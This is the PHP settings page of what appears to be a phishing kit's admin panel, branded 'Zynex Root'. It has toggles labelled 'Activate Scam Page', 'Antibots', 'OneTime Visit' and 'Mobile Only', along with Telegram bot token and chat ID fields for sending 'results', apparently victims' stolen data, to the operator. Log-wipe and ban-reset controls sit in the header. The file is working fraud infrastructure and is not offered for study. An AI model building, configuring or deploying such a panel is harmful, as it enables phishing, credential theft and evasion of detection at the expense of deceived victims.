<?php
include 'inc/config.php';
include 'inc/connect.php';
date_default_timezone_set('Europe/Dublin');
session_start();

// Redirect if not logged in
if (!isset($_SESSION['loggedin'])) {
    header('Location: login.php');
    exit;
}

// Redirect if not admin and handler access is not checked
if ($handlers_access != "checked" && $_SESSION['role'] != "Admin") {
    header('Location: login.php'); // Change the redirect location if needed
    exit;
}

// Check if checkbox state file exists
if (file_exists("offline.txt")) {
    // Read checkbox state from file
    $checkbox_state = file_get_contents("offline.txt");
    // Set session variable accordingly
    $_SESSION['checkbox_state'] = intval($checkbox_state);
} else {
    // If file doesn't exist, set checkbox state to unchecked
    $_SESSION['checkbox_state'] = 0;
}

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Zynex Root - Home</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <!-- Bootstrap CSS-->
  <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
  <!-- Font Awesome CSS-->
  <link rel="stylesheet" href="vendor/font-awesome/css/font-awesome.min.css">
  <!-- Micron Animations CSS-->
  <link rel='stylesheet' href='https://unpkg.com/webkul-micron@1.1.6/dist/css/micron.min.css'>
  <!-- Custom Font Icons CSS-->
  <link rel="stylesheet" href="css/font.css">
  <!-- Toasrt Alerts CSS-->
  <link rel="stylesheet" href="css/toastr.min.css">
  <!-- Flags Icons CSS-->
  <link rel="stylesheet" href="css/flag-icon.css">
  <!-- Google fonts - Muli-->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Muli:300,400,700">
  <!-- theme stylesheet-->
  <link rel="stylesheet" href="css/style.default.css" id="theme-stylesheet">
  <!-- Custom stylesheet - for your changes-->
  <link rel="stylesheet" href="css/custom.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <!-- Favicon-->
  <link rel="shortcut icon" href="img/favicon.ico">

  <style>
    .blink_me {
      animation: blinker 1s linear infinite;
    }

    @keyframes blinker {
      50% {
        background-color: rgba(32, 120, 102, 0.3);

      }
    }
  </style>


<?= $robots_script ?>
</head>

<body>
  <header class="header">
    <nav class="navbar navbar-expand-lg">

      <div class="container-fluid d-flex align-items-center justify-content-between">
        <div class="navbar-header">
          <!-- Navbar Header-->
<a href="index.php">
    <img src="logo.png"  style="width: 70px; height: 70px; cursor: pointer;">
</a>
          <!-- Sidebar Toggle Btn-->

        </div>
<!-- Title Section with Larger, White Icons -->
<div class="title" style="background-color: #222; padding: 15px; border-radius: 8px;">
    <i title="Reset Bans" onclick="reset_bans();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-recycle"></i>
    <i title="Reset Visits" onclick="reset_visits();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-globe"></i>
    <i title="Wipe Logs" onclick="wipe();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-trash"></i>
    <i title="Pause All Alerts" onclick="pause_all_alerts();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-bell-slash"></i>
</div>

<!-- Example JavaScript Functions -->

        <!-- Log out               -->
<div class="list-inline-item logout" style="padding: 10px; display: flex; align-items: center;">
<a href="index.php" class="nav-link" style="color: white; padding: 5px 10px; margin-right: 5px;">
    <i class="fa fa-home" style="font-size: 24px; margin-right: 5px;"></i>
    <span>Home</span>
</a>
<a href="crew.php" class="nav-link" style="color: white; padding: 5px 10px; margin-right: 5px;">
    <i class="fa fa-users" style="font-size: 24px; margin-right: 5px;"></i>
    <span>Crew</span>
</a>

    <a id="logout" href="logout.php" class="nav-link" style="color: white; padding: 5px 10px;">
        <span class="d-none d-sm-inline">Logout</span>
        <i title="Logout" class="fa fa-sign-out-alt" style="font-size: 24px; margin-left: 5px;"></i>
    </a>
</div>



		</div>
      </div>
    </nav>
  </header>
  <div class="d-flex align-items-stretch">
    <!-- Sidebar Navigation-->

<style>
/* General Layout */
.page-content {
    background-color: #0A0F1A;
    color: #f0f0f0;
    padding: 20px;
}

/* Panel Styling */
.block {
    background-color: #2b2b3d;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
}

.title {
    font-size: 18px;
    font-weight: bold;
    margin-bottom: 20px;
}

/* Form Controls */
.form-control {
    background-color: #35354a;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 10px;
}

.form-control:focus {
    box-shadow: 0px 0px 5px #1a1a2e;
}

/* Checkboxes Styling */
.checkbox-container {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
}

.i-checks {
    display: flex;
    align-items: center;
    background-color: #35354a;
    padding: 8px;
    border-radius: 4px;
}

.i-checks input[type="checkbox"] {
    margin-right: 10px;
}

.i-checks label {
    margin: 0;
}

/* Save Button */
.btn-primary {
    background-color: #3498db;
    border: none;
    border-radius: 4px;
    padding: 10px 20px;
    transition: background-color 0.3s ease;
}

.btn-primary:hover {
    background-color: #217dbb;
}

</style>


    <!-- Sidebar Navigation end-->
    <div class="page-content">
    <section class="no-padding-bottom">
        <div class="col-lg-12">
            <div class="block">
                <div class="block-body">
                    <form method="POST" action="set.php" class="form-horizontal">
                        <div style="display: none;" class="form-group row">
                            <label class="col-sm-3 form-control-label">Database Host</label>
                            <div class="col-sm-9">
                                <input value="<?= $servername ?>" name="dbhost" type="text" class="form-control" required>
                            </div>
                        </div>
                        <div style="display: none;" class="form-group row">
                            <label class="col-sm-3 form-control-label">Database Name</label>
                            <div class="col-sm-9">
                                <input value="<?= $database ?>" name="dbname" type="text" class="form-control" required>
                            </div>
                        </div>
                        <div style="display: none;" class="form-group row">
                            <label class="col-sm-3 form-control-label">Database Username</label>
                            <div class="col-sm-9">
                                <input value="<?= $username ?>" name="dbuser" type="text" class="form-control" required>
                            </div>
                        </div>
                        <div style="display: none;" class="form-group row">
                            <label class="col-sm-3 form-control-label">Database Password</label>
                            <div class="col-sm-9">
                                <input value="<?= $password ?>" name="dbpass" type="password" class="form-control">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-3 form-control-label">Admin Username</label>
                            <div class="col-sm-9">
                                <input value="<?= $admin_panel_username ?>" name="adminuser" type="text" class="form-control" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-3 form-control-label">Admin Password</label>
                            <div class="col-sm-9">
                                <input value="<?= $admin_panel_password ?>" name="adminpass" type="password" class="form-control" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-3 form-control-label">Redirection Link</label>
                            <div class="col-sm-9">
                                <input value="<?= $exit_url ?>" name="extlink" type="url" class="form-control" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-3 form-control-label">Telegram Chat Id</label>
                            <div class="col-sm-9">
                                <input value="<?= $telegram_chaid ?>" name="chatid" type="text" class="form-control">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-3 form-control-label">Telegram Bot Token</label>
                            <div class="col-sm-9">
                                <input value="<?= $bot_token ?>" name="bottoken" type="text" class="form-control">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-3 form-control-label">Config</label>
                            <div class="col-sm-9">
                                <div class="checkbox-container">
								     <div class="i-checks">
                                        <input type="checkbox" id="checkbox_state" name="checkbox_state" <?php if ($_SESSION['checkbox_state'] == 1) echo "checked"; ?>>
                                        <label for="checkbox_state">Activate Auto Mode</label>
                                    </div>
                                    <div class="i-checks">
                                        <input name="gateway" id="checkbox1" type="checkbox" class="checkbox-template" <?= $enable_gateway ?>>
                                        <label for="checkbox1">Activate Scam Page</label>
                                    </div>
                                    <div class="i-checks">
                                        <input name="antibots" id="checkbox2" type="checkbox" class="checkbox-template" <?= $enable_antibots ?>>
                                        <label for="checkbox2">Activate  Antibots</label>
                                    </div>
                                    <div class="i-checks">
                                        <input name="onetime" id="checkbox6" type="checkbox" class="checkbox-template" <?= $enable_onetime ?>>
                                        <label for="checkbox6">Activate OneTime Visit</label>
                                    </div>
                                    <div class="i-checks">
                                        <input name="moblock" id="checkbox8" type="checkbox" class="checkbox-template" <?= $mobile_lock ?>>
                                        <label for="checkbox8">Activate Mobile Only</label>
                                    </div>
                                    <div class="i-checks">
                                        <input name="notify" id="checkbox3" type="checkbox" class="checkbox-template" <?= $enable_telegram ?>>
                                        <label for="checkbox3">Activate Telegram Results</label>
                                    </div>


                                </div>
                            </div>
                        </div>
                        <div class="form-group row">
                            <div class="col-sm-9 ml-auto">
                                <button type="submit" class="btn btn-primary">Save changes</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
</div>


    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/popper.js/umd/popper.min.js"> </script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendor/jquery.cookie/jquery.cookie.js"> </script>
    <script src="vendor/jquery-validation/jquery.validate.min.js"></script>
    <script src="js/front.js"></script>
    <script src="js/toastr.min.js"></script>
    <script src="https://unpkg.com/webkul-micron@1.1.6/dist/script/micron.min.js"></script>
    <script src="js/other.js"></script>
    <?php
    if ($_SESSION['update_settings'] == 'success') {
        echo '<script>toastr["success"]("settings updated successfully");</script>';
        $_SESSION['update_settings'] = '';
    }
    ?>




</body>

</html>